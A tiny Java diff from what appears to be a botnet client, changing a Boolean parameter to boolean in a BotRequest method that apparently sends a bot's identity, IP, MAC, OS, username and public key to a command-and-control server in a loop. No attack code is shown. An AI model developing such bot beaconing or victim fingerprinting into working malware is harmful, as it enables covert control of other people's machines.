@@ -242,7 +242,7 @@ public class BotRequest {
 	 * @return
 	 */
 	public String getResponseFromCeC(String idBot, IP ip, String Mac, String os, String vers, String arch,
-			String usrName, IP dest, String hashMac, PublicKey pk, Boolean elegible) {
+			String usrName, IP dest, String hashMac, PublicKey pk, boolean elegible) {
 		Integer counter = 0;
 		String response = "";
 		while (true) {// (counter <= REQNUMBER) {
